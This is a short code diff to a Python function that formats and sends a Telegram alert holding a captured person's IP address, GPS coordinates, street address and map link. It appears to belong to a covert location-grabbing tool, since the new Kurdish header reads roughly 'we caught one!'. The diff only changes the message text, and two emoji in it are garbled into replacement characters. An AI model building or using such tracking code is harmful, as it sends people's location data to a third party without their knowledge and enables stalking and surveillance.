@@ -130,12 +130,13 @@ def collect():
 
     maps_link = f'https://maps.google.com/?q={latitude},{longitude}'
     msg = (
-        f'📍 <b>موقعیت GPS گیرا</b>\n'
-        f'━━━━━━━━━━━━━━━━━━━\n'
+        f'🎯 <b>ئەرەوەلا دانەیەکمان گرت!</b>\n'
+        f'━━━━━━━━━━━━━━━━━━━━━━\n'
+        f'📍 <b>جۆر:</b> GPS\n'
         f'🌐 <b>IP:</b> <code>{client_ip}</code>\n'
-        f'📌 <b>کووردینات:</b> <code>{latitude}, {longitude}</code>\n'
+        f'� <b>لۆکەیشنی جوگرافی:</b> <code>{latitude}, {longitude}</code>\n'
         f'🏠 <b>ناونیشان:</b> {address}\n'
-        f'🗺 <b>Google Maps:</b> <a href="{maps_link}">{maps_link}</a>\n'
+        f'� <b>Google Maps:</b> <a href="{maps_link}">کرتە بکە بینیت</a>\n'
         f'🕐 <b>کات:</b> {log_entry["timestamp"]}'
     )
     send_telegram(msg)
